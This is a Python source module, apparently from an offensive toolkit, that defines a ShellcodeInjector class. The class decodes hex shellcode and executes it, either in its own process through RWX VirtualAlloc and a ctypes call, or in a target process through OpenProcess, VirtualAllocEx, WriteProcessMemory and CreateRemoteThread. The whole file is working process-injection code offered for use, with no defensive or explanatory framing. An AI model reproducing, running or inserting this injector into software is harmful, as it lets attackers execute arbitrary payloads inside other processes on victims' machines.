"""
Shellcode Injection
Inject and execute shellcode in memory
"""

import ctypes

from ..core.constants import (
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    PROCESS_ALL_ACCESS
)


class ShellcodeInjector:
    """
    Shellcode Injection
    
    Injects and executes shellcode directly in memory
    """
    
    def __init__(self, kernel32):
        """
        Initialize shellcode injector
        
        Args:
            kernel32: Windows kernel32.dll handle
        """
        self.kernel32 = kernel32
    
    def inject(self, shellcode_hex, target_pid=None):
        """
        Inject and execute shellcode
        
        Args:
            shellcode_hex (str): Hex-encoded shellcode
            target_pid (int, optional): Target process PID
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            # Decode shellcode from hex
            shellcode = bytes.fromhex(shellcode_hex)
            shellcode_size = len(shellcode)
            
            print(f"[+] Shellcode size: {shellcode_size} bytes")
            
            if target_pid:
                return self._inject_remote(shellcode, shellcode_size, target_pid)
            else:
                return self._inject_local(shellcode, shellcode_size)
        
        except ValueError:
            print(f"[!] Invalid hex string")
            return False
        except Exception as e:
            print(f"[!] Shellcode injection failed: {e}")
            return False
    
    def _inject_local(self, shellcode, shellcode_size):
        """
        Inject shellcode into current process
        
        Args:
            shellcode (bytes): Shellcode bytes
            shellcode_size (int): Size of shellcode
            
        Returns:
            bool: True if successful
        """
        print(f"[+] Injecting into current process")
        
        # Allocate memory in current process
        memory_address = self.kernel32.VirtualAlloc(
            None,
            shellcode_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )
        
        if not memory_address:
            print(f"[!] VirtualAlloc failed")
            return False
        
        print(f"[+] Allocated at: 0x{memory_address:X}")
        
        # Copy shellcode to allocated memory
        ctypes.memmove(memory_address, shellcode, shellcode_size)
        
        print(f"[+] Shellcode copied to memory")
        print(f"[+] Executing shellcode...")
        
        # Execute shellcode
        try:
            shellcode_func = ctypes.CFUNCTYPE(None)(memory_address)
            shellcode_func()
            
            print(f"[+] Shellcode executed successfully")
            return True
        
        except Exception as e:
            print(f"[-] Shellcode execution failed: {e}")
            return False
    
    def _inject_remote(self, shellcode, shellcode_size, target_pid):
        """
        Inject shellcode into remote process
        
        Args:
            shellcode (bytes): Shellcode bytes
            shellcode_size (int): Size of shellcode
            target_pid (int): Target process PID
            
        Returns:
            bool: True if successful
        """
        print(f"[+] Opening target process: PID {target_pid}")
        
        # Open target process
        h_process = self.kernel32.OpenProcess(
            PROCESS_ALL_ACCESS,
            False,
            target_pid
        )
        
        if not h_process:
            print(f"[!] Failed to open process {target_pid}")
            return False
        
        try:
            # Allocate memory in target process
            print(f"[+] Allocating memory in target process...")
            remote_memory = self.kernel32.VirtualAllocEx(
                h_process,
                None,
                shellcode_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            )
            
            if not remote_memory:
                print(f"[!] VirtualAllocEx failed")
                return False
            
            print(f"[+] Allocated at: 0x{remote_memory:X}")
            
            # Write shellcode to allocated memory
            print(f"[+] Writing shellcode to memory...")
            written = ctypes.c_size_t(0)
            result = self.kernel32.WriteProcessMemory(
                h_process,
                remote_memory,
                shellcode,
                shellcode_size,
                ctypes.byref(written)
            )
            
            if not result:
                print(f"[!] WriteProcessMemory failed")
                return False
            
            print(f"[+] Wrote {written.value} bytes")
            
            # Create remote thread to execute shellcode
            print(f"[+] Creating remote thread...")
            h_thread = self.kernel32.CreateRemoteThread(
                h_process,
                None,
                0,
                remote_memory,
                None,
                0,
                None
            )
            
            if not h_thread:
                print(f"[!] CreateRemoteThread failed")
                return False
            
            print(f"[+] Shellcode executing in memory")
            print(f"[+] Thread handle: 0x{h_thread:X}")
            
            # Wait for thread completion (optional)
            self.kernel32.WaitForSingleObject(h_thread, -1)
            
            # Cleanup
            self.kernel32.CloseHandle(h_thread)
            
            print(f"[+] Shellcode executed successfully")
            return True
        
        finally:
            self.kernel32.CloseHandle(h_process)